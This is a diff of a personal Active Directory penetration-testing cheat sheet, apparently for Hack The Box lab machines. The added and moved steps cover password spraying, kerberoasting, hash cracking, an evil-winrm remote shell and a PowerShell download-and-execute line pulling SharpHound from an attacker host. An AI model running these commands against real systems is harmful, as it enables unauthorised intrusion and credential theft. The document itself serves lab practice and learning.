@@ -15,10 +15,15 @@ Helpful to get ports from rustscan output saved to a file, only ports btw
 @@ dig axfr  @10.10.10.161 htb.local @@
 ```
 9. `ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161`, -x to check for anonymous login.
-10. `smbmap -H 10.10.10.161` try to share without password.
-11. `smbmap -H 10.10.10.161 -u 0xdf -p 0xdf`.
-12. `smbclient -N -L //10.10.10.161`.
-13. SMB one liner to download everythig recursively.
+10. Check for account lockout policy
+```diff
+@@ ldapsearch -x -H ldap://10.10.10.169 -b "dc=megabank,dc=local" -s sub "*" @@
+The lockoutThreshold: 0 indicates that there is no account lockout policy. 
+```
+12. `smbmap -H 10.10.10.161` try to share without password.
+13. `smbmap -H 10.10.10.161 -u 0xdf -p 0xdf`.
+14. `smbclient -N -L //10.10.10.161`.
+15. SMB one liner to download everythig recursively.
 ```diff
 @@ smbclient //10.10.10.192/profiles$ -N -c "prompt OFF;recurse ON; lcd; mget *" @@
 + If u have username
@@ -30,17 +35,31 @@ Helpful to get ports from rustscan output saved to a file, only ports btw
 17. Enumerate RCP `rpcclient -U "" -N 10.10.10.161`, if u get shell `enumdomusers`, put it in `user.txt`.
 18. Enumerate AD for users again `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U `.
 19. `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"`.
-20. `for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`, kerberoasting (get TGT without authentication).
-21. Find account configured with Service Principal Name (SPNs) `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100` (Need to find password first).
-22. Get TGT `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request`.
-23. Now crach the hash `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`, or `john hash --fork=4 -w=<list>`
-24. `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` to get remote shell. port `5985` must be open.
-25. Now try to get information about privilge escalation.
-26. Run `neo4j`.
-27. Run `Bloodhound --no-sandbox` to open up webUI.
-28. OK now u need to transfer `Collection` scripts from the github repo to the victim.
-29. Load Bloodhound `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")`.
-30. Or directly run exe.
+20. Check for password in description
+```diff
+@@ ./windapsearch.py -d resolute.megabank.local --dc-ip 10.10.10.169 -U --full | grep Password
+```
+21. If u have got a passwod somehow, spray it
+```diff
+for u in $(cat users | awk -F@ '{print $1}' | awk -F: '{print $2}');
+do
+rpcclient -U "$u%Welcome123!" -c "getusername;quit" 10.10.10.169 | grep Authority;
+done
+```
+**OR** 
+if u have just users in file
+`for user in $(cat users.md); do rpcclient -U "$user%Welcome123" -c "getusername;quit" 10.10.10.169 | grep Authority; done`
+23. `for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`, kerberoasting (get TGT without authentication).
+24. Find account configured with Service Principal Name (SPNs) `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100` (Need to find password first).
+25. Get TGT `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request`.
+26. Now crach the hash `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`, or `john hash --fork=4 -w=<list>`
+27. `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` to get remote shell. port `5985` must be open.
+28. Now try to get information about privilge escalation.
+29. Run `neo4j`.
+30. Run `Bloodhound --no-sandbox` to open up webUI.
+31. OK now u need to transfer `Collection` scripts from the github repo to the victim.
+32. Load Bloodhound `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")`.
+33. Or directly run exe.
 ```diff
 + To install bloddhound
 + apt install bloodhound
